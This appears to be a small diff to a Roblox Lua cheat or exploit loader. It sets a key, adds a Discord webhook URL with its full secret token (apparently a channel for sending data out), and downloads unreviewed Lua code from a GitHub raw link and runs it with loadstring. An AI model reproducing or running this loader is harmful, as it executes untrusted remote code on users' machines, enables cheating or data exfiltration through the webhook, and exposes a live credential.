@@ -1,3 +1,4 @@
 _G.Key = "1813497217"
+_G.Webhook = "https://discord.com/api/webhooks/1085259656940761099/JSZtJRvkxZI8P9xfNEC3zqC4Dq5ovXMpnuG033v2VgrdZIMbLrQS_KKQ90-bbhafh7a5"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KIDINApsx/versions/main/v1.lua"))()
